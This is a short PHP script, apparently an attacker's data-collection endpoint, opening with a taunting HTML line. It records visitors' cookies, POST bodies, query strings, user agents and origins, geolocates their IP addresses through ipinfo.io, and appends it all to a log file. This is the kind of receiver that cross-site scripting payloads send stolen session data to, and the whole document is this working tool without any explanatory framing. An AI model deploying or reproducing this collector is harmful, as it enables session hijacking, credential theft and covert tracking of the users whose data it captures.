<p>This is the type of place that you don't wanne come :D</p>

<?php 
$pwd = getcwd();
$date = date('Y-m-d H:i:s');



function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function ip_details($ip) {
    $json = file_get_contents("https://ipinfo.io/{$ip}/json");
    $details = json_decode($json);
    return $details;
}



$head = $_SERVER['REQUEST_METHOD'] .' - '. $_SERVER['SERVER_PROTOCOL'] . ' - ' . $_SERVER['PHP_SELF'] . "\nUser-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\nOrigin: " . $_SERVER['HTTP_ORIGIN'];



$cookies = 'Cookie: ';

foreach($_COOKIE as $key=>$value) {
    // echo $key . "-->" . $value;
    $cookies .= $key . "=" . $value . "; ";

}


// echo $_COOKIE["whatever"];
$client_data = file_get_contents("php://input");
// echo "whatever";
echo $client_data;



$post_data = 'Data [Post] => ' . $client_data;

$data = 'Data => '. $_SERVER['QUERY_STRING'] . "\nDate => " . $date;

$client_ip = get_client_ip();
$ipdetail = ip_details($client_ip);
$ipinfo = 'ip => ' . $ipdetail->ip;
$ipinfo .= ' | hostname => ' . $ipdetail->hostname;
$ipinfo .= ' | city => ' . $ipdetail->city;
$ipinfo .= ' | region => ' . $ipdetail->region;
$ipinfo .= "\ncountry => " . $ipdetail->country;
$ipinfo .= ' | loc => ' . $ipdetail->loc;
$ipinfo .= ' | org => ' . $ipdetail->org;


$push = str_repeat("-", 40) . "\n" . $head . "\n" . $cookies . "\n" . $post_data . "\n". $data ."\n". $ipinfo ."\n" . str_repeat("-", 40) . "\n\n";
$ret = file_put_contents('jj-log/access.log', $push, FILE_APPEND | LOCK_EX);

if($ret === false) {
    die('There was an error writing this file');
}
else {
    // $url = 'http://facebook.com'; //define your location you want to redirect
    // $url = 'index.php'; //define your location you want to redirect
    // header('Location: ' . $url); exit();
    echo '<pre></pre>';
}








 ?>

